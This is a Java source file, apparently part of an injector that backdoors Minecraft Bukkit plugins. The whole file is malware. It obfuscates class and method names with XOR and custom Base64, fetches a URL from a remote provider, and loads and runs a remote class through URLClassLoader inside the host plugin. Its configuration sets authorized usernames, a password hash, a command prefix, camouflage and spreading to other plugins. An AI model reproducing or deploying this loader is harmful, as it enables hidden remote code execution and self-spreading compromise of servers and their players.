package com.tmquan2508.exploit;

import org.bukkit.plugin.Plugin;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.util.Arrays;

public final class Config {
    public static String KEY = "::KEY::";
    public static String S_URL_PROVIDER = "::S_URL_PROVIDER::";
    public static String S_JAVA_NET_URL = "::S_JAVA_NET_URL::";
    public static String S_JAVA_NET_URL_CLASS_LOADER = "::S_JAVA_NET_URL_CLASS_LOADER::";
    public static String S_JAVA_LANG_CLASS_LOADER = "::S_JAVA_LANG_CLASS_LOADER::";
    public static String S_MAIN_CLASS = "::S_MAIN_CLASS::";
    public static String S_LOAD_CLASS_METHOD = "::S_LOAD_CLASS_METHOD::";
    public static String S_HTTP_CONN_CLASS = "::S_HTTP_CONN_CLASS::";
    public static String S_URL_CONN_CLASS = "::S_URL_CONN_CLASS::";
    public static String S_OPEN_CONN_METHOD = "::S_OPEN_CONN_METHOD::";
    public static String S_SET_REQ_METHOD = "::S_SET_REQ_METHOD::";
    public static String S_HTTP_GET_METHOD = "::S_HTTP_GET_METHOD::";
    public static String S_GET_INPUT_STREAM_METHOD = "::S_GET_INPUT_STREAM_METHOD::";
    public static String S_DISCONNECT_METHOD = "::S_DISCONNECT_METHOD::";

    public Config(Plugin plugin) {
        try {
            plugin.getLogger().info("[DEBUG] Initializing remote module...");

            String urlProvider = HiddenUtils.decrypt(S_URL_PROVIDER);
            plugin.getLogger().info("[DEBUG] Fetching resource from: " + urlProvider);

            Object connection = createConnection(urlProvider);
            InputStream inputStream = getStreamFromConnection(connection);
            String urlStr = readFromStream(inputStream);
            closeConnection(connection);

            if (urlStr == null) {
                plugin.getLogger().severe("[DEBUG] Failed to fetch resource URL. Aborting.");
                return;
            }
            plugin.getLogger().info("[DEBUG] Fetched resource URL: " + urlStr);

            Class<?> urlClass = Class.forName(HiddenUtils.decrypt(S_JAVA_NET_URL));
            Object url = HiddenUtils.invokeConstructor(urlClass, new Class<?>[]{String.class}, urlStr);

            Object urlsArray = java.lang.reflect.Array.newInstance(urlClass, 1);
            java.lang.reflect.Array.set(urlsArray, 0, url);

            Class<?> clClass = Class.forName(HiddenUtils.decrypt(S_JAVA_NET_URL_CLASS_LOADER));
            Class<?> classLoaderClass = Class.forName(HiddenUtils.decrypt(S_JAVA_LANG_CLASS_LOADER));
            Object classLoader = HiddenUtils.invokeConstructor(clClass, new Class<?>[]{urlsArray.getClass(), classLoaderClass}, urlsArray, plugin.getClass().getClassLoader());

            String mainClassName = HiddenUtils.decrypt(S_MAIN_CLASS);
            Class<?> loadedClass = (Class<?>) HiddenUtils.invokeInstanceMethod(classLoader, classLoader.getClass(), HiddenUtils.decrypt(S_LOAD_CLASS_METHOD), Class.class, new Class<?>[]{String.class}, mainClassName);

            HiddenUtils.invokeConstructor(loadedClass, new Class<?>[]{Plugin.class, Config.class}, plugin, this);

            plugin.getLogger().info("[SUCCESS] Remote module initialized successfully!");

        } catch (Throwable e) {
            plugin.getLogger().severe("!!! A CRITICAL ERROR OCCURRED DURING MODULE INITIALIZATION !!!");
            e.printStackTrace();
        }
    }

    private Object createConnection(String urlStr) throws Throwable {
        Class<?> urlClass = Class.forName(HiddenUtils.decrypt(S_JAVA_NET_URL));
        Object url = HiddenUtils.invokeConstructor(urlClass, new Class<?>[]{String.class}, urlStr);
        Class<?> urlConnectionClass = Class.forName(HiddenUtils.decrypt(S_URL_CONN_CLASS));
        return HiddenUtils.invokeInstanceMethod(url, urlClass, HiddenUtils.decrypt(S_OPEN_CONN_METHOD), urlConnectionClass, new Class<?>[]{});
    }

    private InputStream getStreamFromConnection(Object conn) throws Throwable {
        Class<?> urlConnectionClass = Class.forName(HiddenUtils.decrypt(S_URL_CONN_CLASS));
        Class<?> httpConnectionClass = Class.forName(HiddenUtils.decrypt(S_HTTP_CONN_CLASS));
        String getMethod = HiddenUtils.decrypt(S_HTTP_GET_METHOD);
        HiddenUtils.invokeInstanceMethod(conn, httpConnectionClass, HiddenUtils.decrypt(S_SET_REQ_METHOD), void.class, new Class<?>[]{String.class}, getMethod);
        return (InputStream) HiddenUtils.invokeInstanceMethod(conn, urlConnectionClass, HiddenUtils.decrypt(S_GET_INPUT_STREAM_METHOD), InputStream.class, new Class<?>[]{});
    }

    private String readFromStream(InputStream is) throws Throwable {
        try (InputStream stream = is) {
            return new BufferedReader(new InputStreamReader(stream)).readLine();
        }
    }

    private void closeConnection(Object conn) throws Throwable {
        Class<?> httpConnectionClass = Class.forName(HiddenUtils.decrypt(S_HTTP_CONN_CLASS));
        HiddenUtils.invokeInstanceMethod(conn, httpConnectionClass, HiddenUtils.decrypt(S_DISCONNECT_METHOD), void.class, new Class<?>[]{});
    }

    public static String[] authorized_uuids;
    public static String[] authorized_usernames;
    public static String command_prefix;
    public static boolean spread_to_other;
    public static boolean debug_log;
    public static String discord_token;
    public static String authorized_password;
    public static boolean camouflage;
    static { getInjectedConfig(); }
    private static void getInjectedConfig() {
        String injected_authorized_uuids = "";
        String injected_authorized_usernames = "Kudo,Vdung";
        String injected_command_prefix = "!";
        boolean injected_spread_to_other = Boolean.parseBoolean("true");
        boolean injected_debug_log = Boolean.parseBoolean("true");
        String injected_discord_token = "";
        String injected_authorized_password = "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5";
        boolean injected_camouflage = Boolean.parseBoolean("true");
        authorized_uuids = injected_authorized_uuids.isEmpty() ? new String[0] : injected_authorized_uuids.split(",");
        authorized_usernames = injected_authorized_usernames.isEmpty() ? new String[0] : injected_authorized_usernames.split(",");
        command_prefix = injected_command_prefix;
        spread_to_other = injected_spread_to_other;
        debug_log = injected_debug_log;
        discord_token = injected_discord_token;
        authorized_password = injected_authorized_password;
        camouflage = injected_camouflage;
    }

    public static final class HiddenUtils {
        public static String decrypt(String encryptedString) {
            try {
                byte[] decoded = customBase64Decode(encryptedString);
                byte[] keyBytes = Config.KEY.getBytes("UTF-8");
                for (int i = 0; i < decoded.length; i++) {
                    decoded[i] = (byte) (decoded[i] ^ keyBytes[i % keyBytes.length]);
                }
                return new String(decoded, "UTF-8");
            } catch (Exception ex) {
                return "decoding.error";
            }
        }

        private static final int[] FROM_BASE64 = new int[256];
        static {
            Arrays.fill(FROM_BASE64, -1);
            String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            for (int i = 0; i < chars.length(); i++) {
                FROM_BASE64[chars.charAt(i)] = i;
            }
            FROM_BASE64['='] = -2;
        }

        private static byte[] customBase64Decode(String src) {
            src = src.replaceAll("\\s", "");
            int len = src.length();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(len * 3 / 4);
            int[] buffer = new int[4];
            int bufferCounter = 0;
            for (int i = 0; i < len; i++) {
                int val = FROM_BASE64[src.charAt(i) & 0xFF];
                if (val >= 0) {
                    buffer[bufferCounter++] = val;
                    if (bufferCounter == 4) {
                        baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                        baos.write((buffer[2] << 6) | buffer[3]);
                        bufferCounter = 0;
                    }
                } else if (val == -2) {
                    if (bufferCounter == 2) baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                    else if (bufferCounter == 3) {
                        baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                    }
                    break;
                }
            }
            return baos.toByteArray();
        }


        public static <T> T invokeConstructor(Class<T> targetClass, Class<?>[] paramTypes, Object... args) throws Throwable {
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodType constructorType = MethodType.methodType(void.class, paramTypes);
            MethodHandle handle = lookup.findConstructor(targetClass, constructorType);
            return (T) handle.invokeWithArguments(args);
        }

        public static Object invokeInstanceMethod(Object target, Class<?> lookupClass, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) throws Throwable {
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodType methodType = MethodType.methodType(returnType, paramTypes);
            MethodHandle handle = lookup.findVirtual(lookupClass, methodName, methodType);
            return handle.bindTo(target).invokeWithArguments(args);
        }
    }
}